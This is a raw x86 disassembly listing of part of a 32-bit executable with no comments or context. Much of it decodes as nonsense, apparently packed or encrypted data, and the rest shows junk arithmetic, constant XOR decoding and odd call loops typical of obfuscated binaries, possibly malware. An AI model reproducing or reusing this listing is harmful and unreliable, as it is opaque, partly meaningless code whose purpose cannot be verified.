  408ab1:	push   0x42ee30
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42eaac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e76a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e76a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e766,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4304c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	sub    al,0x39
  408b14:	jl     0x408b53
  408b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b17:	sar    BYTE PTR [esi+0x7e],cl
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408b96
  408b1f:	dec    eax
  408b20:	enter  0x8b0b,0x4b
  408b24:	pop    ecx
  408b25:	dec    ebx
  408b26:	mov    ds:0xb5a2bca3,eax
  408b2b:	push   esi
  408b2c:	mov    ah,0x1b
  408b2e:	cmp    edx,DWORD PTR [esi]
  408b30:	push   ebp
  408b31:	mov    eax,ebp
  408b33:	leave  
  408b34:	cli    
  408b35:	shl    dl,0xa0
  408b38:	and    DWORD PTR [eax],ecx
  408b3a:	js     0x408ae0
  408b3c:	and    DWORD PTR [ecx+0x74],esi
  408b3f:	mov    dl,0x47
  408b41:	mov    edx,0xd66da5f2
  408b46:	(bad)  
  408b47:	repz or ebx,DWORD PTR [esi+ebp*8]
  408b4b:	loopne 0x408bc1
  408b4d:	pusha  
  408b4e:	mov    bl,0x5a
  408b50:	add    ah,bl
  408b52:	xor    bh,BYTE PTR [eax+0x54]
  408b55:	adc    eax,DWORD PTR [edi]
  408b57:	shl    dl,cl
  408b59:	xor    WORD PTR [ecx+0x7f53978],ax
  408b60:	mov    edi,0x960f4181
  408b65:	xor    ecx,DWORD PTR [eax+0x47179390]
  408b6b:	loop   0x408b6f
  408b6d:	add    DWORD PTR [ecx*2+0x6bea63d8],edi
  408b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b75:	push   es
  408b76:	or     eax,0x1a01fc96
  408b7b:	cdq    
  408b7c:	dec    ecx
  408b7d:	jl     0x408b09
  408b7f:	inc    ebp
  408b80:	mov    ebp,0x3d4ed053
  408b85:	mov    dl,0x74
  408b87:	jle    0x408be1
  408b89:	into   
  408b8a:	pop    ecx
  408b8b:	dec    esi
  408b8c:	jecxz  0x408b13
  408b8e:	xor    DWORD PTR [eax],0x7b451f64
  408b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b95:	push   edi
  408b96:	push   esi
  408b97:	enter  0xfc8b,0x97
  408b9b:	(bad)  
  408b9d:	out    dx,al
  408b9e:	sub    eax,0xc324f235
  408ba3:	sbb    al,0x94
  408ba5:	rcl    DWORD PTR [ebp+0x6dddcca],cl
  408bab:	ss push eax
  408bad:	dec    edi
  408bae:	sbb    eax,0x9f9e6105
  408bb3:	icebp  
  408bb4:	test   al,0x3c
  408bb6:	repnz sub al,0xe1
  408bb9:	jecxz  0x408bc7
  408bbb:	in     eax,dx
  408bbc:	inc    edx
  408bbd:	pop    ss
  408bbe:	shl    BYTE PTR ds:0xd3264c8d,0x23
  408bc5:	and    edi,ecx
  408bc7:	retf   
  408bc8:	jnp    0x408b72
  408bca:	and    eax,0x5e997025
  408bcf:	mov    edx,0x291450d1
  408bd4:	xchg   edi,eax
  408bd5:	sub    BYTE PTR [edx],cl
  408bd7:	dec    esp
  408bd8:	mov    dh,0xbb
  408bda:	lock sub al,al
  408bdd:	pop    eax
  408bde:	mov    al,0xaf
  408be0:	data16 adc al,0xdd
  408be3:	push   edx
  408be4:	adc    al,0xd5
  408be6:	les    esi,FWORD PTR [esi]
  408be8:	fdiv   DWORD PTR [edi]
  408bea:	inc    esp
  408beb:	xor    DWORD PTR [eax],0xffffffa0
  408bee:	mov    cl,bl
  408bf0:	jle    0x408b83
  408bf2:	sub    bh,bl
  408bf4:	ins    DWORD PTR es:[edi],dx
  408bf5:	jnp    0x408b9f
  408bf7:	pusha  
  408bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf9:	xor    BYTE PTR [esp+ecx*8+0x30],dh
  408bfd:	scas   eax,DWORD PTR es:[edi]
  408bfe:	cs loope 0x408c6b
  408c01:	rcl    DWORD PTR [eax-0x18],1
  408c04:	cli    
  408c05:	lahf   
  408c06:	adc    esi,ebp
  408c08:	sub    al,0x2
  408c0a:	hlt    
  408c0b:	dec    edi
  408c0c:	cmovl  esp,DWORD PTR [edx]
  408c0f:	mov    bh,ah
  408c11:	(bad)  
  408c12:	lods   al,BYTE PTR ds:[esi]
  408c13:	icebp  
  408c14:	jmp    0x408c34
  408c16:	fidivr WORD PTR [ecx-0x5d364357]
  408c1c:	fdiv   DWORD PTR [eax+0x7ec19772]
  408c22:	sbb    al,0xa
  408c24:	xchg   esi,eax
  408c25:	outs   dx,DWORD PTR ds:[esi]
  408c26:	sub    esp,DWORD PTR [eax-0x76cdccd4]
  408c2c:	pop    esi
  408c2d:	cdq    
  408c2e:	mov    dh,0xc2
  408c30:	int3   
  408c31:	inc    ebx
  408c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c33:	scas   al,BYTE PTR es:[edi]
  408c34:	test   BYTE PTR [ebx],dh
  408c36:	je     0x408c8c
  408c38:	lahf   
  408c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c3a:	shr    BYTE PTR [ecx],cl
  408c3c:	test   DWORD PTR [ecx+eiz*1-0x4da43ebf],ebp
  408c43:	sti    
  408c44:	das    
  408c45:	int    0x87
  408c47:	lock sbb ah,BYTE PTR [esi-0x10]
  408c4b:	mov    ds:0x4a2abbba,al
  408c50:	(bad)  
  408c51:	scas   eax,DWORD PTR es:[edi]
  408c52:	push   0xfffffff0
  408c54:	push   ebx
  408c55:	rcl    DWORD PTR [esi-0x4b7e0ac9],1
  408c5b:	clc    
  408c5c:	ins    DWORD PTR es:[edi],dx
  408c5d:	mov    al,ds:0x6e51a86a
  408c62:	test   DWORD PTR [edi],ecx
  408c64:	mov    al,ds:0x93abf2fc
  408c69:	das    
  408c6a:	inc    eax
  408c6b:	mov    edi,0xe66a97d0
  408c70:	nop
  408c71:	or     ebp,esp
  408c73:	aad    0x5e
  408c75:	popa   
  408c76:	out    dx,al
  408c77:	push   ebx
  408c78:	sub    eax,0xba5ec5f4
  408c7d:	jmp    0xbf5fca8c
  408c82:	loopne 0x408c76
  408c84:	in     al,dx
  408c85:	rol    BYTE PTR [esi+0x363aa99],0xe4
  408c8c:	cli    
  408c8d:	inc    esi
  408c8e:	in     eax,0x74
  408c90:	(bad)  
  408c92:	and    al,0x32
  408c94:	jp     0x408ce9
  408c96:	and    esi,esp
  408c98:	add    esp,DWORD PTR [edx]
  408c9a:	xor    al,0xf2
  408c9c:	ja     0x408c32
  408c9e:	lds    eax,FWORD PTR [ebp+ebx*1-0x52]
  408ca2:	inc    ebp
  408ca3:	ja     0x408ca5
  408ca5:	sbb    cl,0xdc
  408ca8:	sub    eax,0xf3cc4e87
  408cad:	xor    esp,DWORD PTR [ebp-0x6b]
  408cb0:	(bad)  
  408cb2:	pop    ecx
  408cb3:	mov    eax,0x855de0bf
  408cb8:	mov    eax,0x6d54dbd7
  408cbd:	aam    0x78
  408cbf:	sahf   
  408cc0:	cld    
  408cc1:	sti    
  408cc2:	mov    edi,DWORD PTR [esi+edx*4-0x739890cc]
  408cc9:	out    0x7a,eax
  408ccb:	push   esi
  408ccc:	jno    0x408d2b
  408cce:	dec    ecx
  408ccf:	cmc    
  408cd0:	and    BYTE PTR [edi*1-0x2eddc3fa],0x1a
  408cd8:	xor    eax,0xc892b6de
  408cdd:	xor    eax,DWORD PTR [ecx]
  408cdf:	mov    bl,BYTE PTR [ecx*4+0x596b5e29]
  408ce6:	out    0x2d,eax
  408ce8:	ss xchg edx,eax
  408cea:	je     0x408d6a
  408cec:	sbb    edx,DWORD PTR [ebp-0x209adb57]
  408cf2:	or     DWORD PTR [edx-0x4b],esp
  408cf5:	add    eax,0x32729d
  408cfa:	mov    DWORD PTR [edx],eax
  408cfc:	mov    edx,DWORD PTR ds:0x430576
  408d02:	mov    eax,ds:0x430592
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	jmp    0x8d0d51e3
  408d59:	aam    0x7e
  408d5b:	jle    0x408da2
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408d52
  408d61:	sub    BYTE PTR [bp+di-0x38c],cl
  408d66:	in     eax,0x8
  408d68:	(bad)  
  408d69:	outs   dx,DWORD PTR ds:[esi]
  408d6a:	mov    ds:0x73676e41,eax
  408d6f:	add    DWORD PTR [ecx],edi
  408d71:	icebp  
  408d72:	mov    al,0x73
  408d74:	cmp    al,0xcb
  408d76:	push   esi
  408d77:	or     DWORD PTR [edi],edx
  408d79:	xchg   ebp,eax
  408d7a:	in     eax,0xb3
  408d7c:	retf   0xe19f
  408d7f:	stc    
  408d80:	and    eax,0x66f2ea12
  408d85:	scas   eax,DWORD PTR es:[edi]
  408d86:	adc    al,0x1f
  408d88:	xchg   ebx,eax
  408d89:	aam    0x25
  408d8b:	xor    DWORD PTR [edx-0x4e9bfe42],0x5e
  408d92:	into   
  408d93:	stos   DWORD PTR es:[edi],eax
  408d94:	inc    ebx
  408d95:	sbb    al,0xe3
  408d97:	rol    eax,cl
  408d99:	add    BYTE PTR [edi+0x69],dh
  408d9c:	retf   0x52d
  408d9f:	pop    esi
  408da0:	push   esi
  408da1:	cmp    BYTE PTR [ecx],bl
  408da3:	cdq    
  408da4:	ret    0xe42a
  408da7:	mov    ebx,DWORD PTR [ecx-0x22]
  408daa:	(bad)  
  408dab:	fidivr DWORD PTR [ebp+ebx*4-0x6a]
  408daf:	mov    ds:0x5e4980bd,eax
  408db4:	stos   BYTE PTR es:[edi],al
  408db5:	sbb    BYTE PTR [edi-0x5ecf2327],dl
  408dbb:	data16 loopne 0x408deb
  408dbe:	in     al,0xb4
  408dc0:	js     0x408dfe
  408dc2:	dec    eax
  408dc3:	out    0xb4,al
  408dc5:	push   eax
  408dc6:	loopne 0x408e16
  408dc8:	ret    0x57f8
  408dcb:	xchg   esi,eax
  408dcc:	jge    0x408d6c
  408dce:	inc    esi
  408dcf:	fwait
  408dd0:	sbb    ecx,edx
  408dd2:	inc    edi
  408dd3:	in     al,0xfc
  408dd5:	mov    dh,0x72
  408dd7:	push   0x6deefc
  408ddc:	hlt    
  408ddd:	int    0x7a
  408ddf:	ins    DWORD PTR es:[edi],dx
  408de0:	and    al,0x61
  408de2:	sti    
  408de3:	cmc    
  408de4:	push   esp
  408de5:	jecxz  0x408d76
  408de7:	(bad)  
  408de8:	jl     0x408e24
  408dea:	test   DWORD PTR [ebx+0x66],eax
  408ded:	stos   DWORD PTR es:[edi],eax
  408dee:	call   DWORD PTR [ebx]
  408df0:	je     0x408dcc
  408df2:	push   edx
  408df3:	sbb    ah,ch
  408df5:	and    BYTE PTR [ebx-0x24dc2e20],dl
  408dfb:	pop    ds
  408dfc:	or     eax,0xce4ba68b
  408e01:	push   esp
  408e02:	jp     0x408e42
  408e04:	outs   dx,DWORD PTR ds:[esi]
  408e05:	push   es
  408e06:	pop    ss
  408e07:	push   edi
  408e08:	jp     0x408e83
  408e0a:	repz push edx
  408e0c:	popa   
  408e0d:	or     al,0xbd
  408e0f:	mov    ecx,0x2b6a6a7f
  408e14:	pop    ecx
  408e15:	shl    ecx,cl
  408e17:	pushf  
  408e18:	dec    ecx
  408e19:	inc    esi
  408e1a:	add    esp,0x22
  408e1d:	dec    ebp
  408e1e:	idiv   BYTE PTR [edi]
  408e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e21:	out    dx,al
  408e22:	pusha  
  408e23:	jmp    0x44d2:0xca4164ef
  408e2a:	add    eax,0x71d00bf4
  408e2f:	repnz imul ebp,DWORD PTR [ebx+esi*1+0x33],0xffffffb4
  408e35:	inc    ecx
  408e36:	dec    ecx
  408e37:	pop    eax
  408e38:	es call 0xd0a4:0x692b46e9
  408e40:	fnstcw WORD PTR [esi]
  408e42:	cmp    ebp,esi
  408e44:	not    ebp
  408e46:	pop    esi
  408e47:	mov    esi,0x479ad334
  408e4d:	int3   
  408e4e:	pop    edi
  408e4f:	adc    al,0x47
  408e51:	dec    esi
  408e52:	repz out dx,al
  408e54:	cmp    DWORD PTR ds:[edx],esi
  408e57:	je     0x408ddf
  408e59:	les    ebp,FWORD PTR [esi+0xa2394a5]
  408e5f:	xchg   ebp,eax
  408e60:	aad    0x71
  408e62:	xchg   esp,eax
  408e63:	add    edi,edx
  408e65:	add    al,0x38
  408e67:	das    
  408e68:	push   esi
  408e69:	push   eax
  408e6a:	test   DWORD PTR [edi],ebp
  408e6c:	add    ebx,DWORD PTR ds:0x14d44db4
  408e72:	dec    ebp
  408e73:	jmp    0xf8e82207
  408e78:	fcomi  st,st(2)
  408e7a:	inc    ebx
  408e7b:	outs   dx,BYTE PTR ds:[esi]
  408e7c:	scas   eax,DWORD PTR es:[edi]
  408e7d:	dec    ebx
  408e7e:	shl    DWORD PTR [ecx+edi*4+0x5a],cl
  408e82:	fisubr WORD PTR cs:0xf2f2d4c6
  408e89:	cmp    al,0x2b
  408e8b:	pop    ecx
  408e8c:	mov    al,fs:0x62414bd7
  408e92:	repnz add DWORD PTR [ebp-0x1a607268],edx
  408e99:	fld    TBYTE PTR [ecx]
  408e9b:	(bad)  
  408e9c:	int    0xdc
  408e9e:	pusha  
  408e9f:	pop    ds
  408ea0:	or     DWORD PTR [eax-0x62],ebp
  408ea3:	outs   dx,BYTE PTR ds:[esi]
  408ea4:	shl    DWORD PTR cs:[edi],1
  408ea7:	pop    ds
  408ea8:	call   0xc01a:0x4f0243de
  408eaf:	shl    DWORD PTR ds:0x607a6aec,cl
  408eb5:	pop    esp
  408eb6:	dec    edx
  408eb7:	mov    DWORD PTR [ebp-0x50],ebp
  408eba:	je     0x408ee2
  408ebc:	add    DWORD PTR [esi-0x75af1c1a],edx
  408ec2:	loope  0x408eda
  408ec4:	mov    WORD PTR [ecx-0x41],?
  408ec7:	into   
  408ec8:	arpl   cx,bx
  408eca:	fcomp  DWORD PTR [eax]
  408ecc:	push   edi
  408ecd:	and    bl,BYTE PTR [ebx+esi*2-0x75]
  408ed1:	add    esp,esi
  408ed3:	mov    WORD PTR [ebx],ds
  408ed5:	xor    edx,DWORD PTR [esp+edi*8+0x4291e46]
  408edc:	call   DWORD PTR [edi]
  408ede:	jge    0x408f38
  408ee0:	dec    eax
  408ee1:	adc    edi,eax
  408ee3:	jmp    0xc750:0x30d8e46
  408eea:	sub    BYTE PTR [edi+0x1e],ah
  408eed:	add    eax,0x955d4137
  408ef2:	adc    dl,BYTE PTR [esi-0x15]
  408ef5:	ja     0x408f3d
  408ef7:	cmp    al,0x5d
  408ef9:	int3   
  408efa:	(bad)  
  408efc:	icebp  
  408efd:	jl     0x408f64
  408eff:	out    dx,eax
  408f00:	fadd   DWORD PTR [esi+esi*1]
  408f03:	loop   0x408efc
  408f05:	out    0x5a,eax
  408f07:	xchg   edx,eax
  408f08:	adc    ecx,esi
  408f0a:	(bad)  
  408f0c:	dec    edx
  408f0d:	fld    DWORD PTR cs:[ebx-0x15]
  408f11:	mov    dl,0x94
  408f13:	fcomp  DWORD PTR [eax-0x3ddf563d]
  408f19:	xchg   esi,eax
  408f1a:	jp     0x408f15
  408f1c:	lahf   
  408f1d:	ins    DWORD PTR es:[edi],dx
  408f1e:	cmc    
  408f1f:	cdq    
  408f20:	mov    edx,0xd3b0bf95
  408f25:	sub    cl,BYTE PTR [eax-0xcaa556e]
  408f2b:	push   ebx
  408f2c:	push   ds
  408f2d:	jecxz  0x408ece
  408f2f:	aaa    
  408f30:	pop    ebp
  408f31:	jecxz  0x408f44
  408f33:	stc    
  408f34:	fstp   DWORD PTR ds:[edi+0x33]
  408f38:	rol    DWORD PTR ds:0x32729d,0xc9
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ee08,0x42e76a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430546,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ee28,0x42e766
  408f71:	call   DWORD PTR ds:0x42ea4c
  408f77:	sbb    DWORD PTR ds:0x42e762,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4304ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4304b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42eb04
  408faf:	sbb    DWORD PTR ds:0x430552,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e75a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4304c2,0x42ee08
  408fe0:	call   DWORD PTR ds:0x42eb80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ee24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42eb44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43055a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ee14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e762,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ea3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4304aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ee24,0x43049a
  409056:	call   DWORD PTR ds:0x42eadc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e762,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e762
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e762,ebx
  40907e:	cmp    DWORD PTR ds:0x42e762,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ebac
  409097:	cmp    DWORD PTR ds:0x42e762,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ee14
  4090aa:	and    DWORD PTR ds:0x42ee20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43048e
  4090bc:	sbb    edx,DWORD PTR ds:0x43054e
  4090c2:	mov    DWORD PTR ds:0x43048e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43049e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43049e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43049e,edx
  4090e2:	cmp    DWORD PTR ds:0x43049e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e77a
  4090f9:	push   0x42e8ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ebb0
  409109:	cmp    DWORD PTR ds:0x43049e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e766,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e766
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e766,edx
  40912d:	cmp    DWORD PTR ds:0x42e766,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42eab0
  40914a:	cmp    DWORD PTR ds:0x42e766,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43049a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43048a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43048a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43048a,esi
  40917b:	cmp    DWORD PTR ds:0x43048a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e87b
  40918d:	push   0x42e77a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42eac8
  40919d:	cmp    DWORD PTR ds:0x43048a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43048a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43048a,esi
  4091b7:	cmp    DWORD PTR ds:0x43048a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ee1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43054e,0x4304a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43054e
  4091fe:	adc    DWORD PTR ds:0x42ee18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43048e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43048e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43048e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43049e,0x4304ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4304ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4304e2
  409277:	mov    eax,ds:0x42e99c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e76e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4304aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4304ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4304b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430556,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ee20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ee20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ee20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42eacc
  409310:	mov    edi,DWORD PTR ds:0x42ee20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ee20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ee14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e776,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e772
  40934d:	adc    edx,DWORD PTR ds:0x4304c2
  409353:	mov    DWORD PTR ds:0x42e772,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ee2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ee2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ee2c,edi
  409376:	cmp    DWORD PTR ds:0x42ee2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e766
  40938b:	call   DWORD PTR ds:0x42ebb4
  409391:	cmp    DWORD PTR ds:0x42ee2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ee2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ee2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ee2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4304b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ee28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ee28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ee28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ee28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ee28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ead0
  409402:	cmp    DWORD PTR ds:0x42ee28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ee28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ee28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ee0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ee0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ee0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42eab4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ee0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ee0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43055a
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43048a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43049e
  409480:	adc    edi,DWORD PTR ds:0x42ee18
  409486:	mov    DWORD PTR ds:0x43049e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42ee30,0x42e76a
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ee20,0x4304ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4304c2
  4094b1:	and    DWORD PTR ds:0x4304be,edi
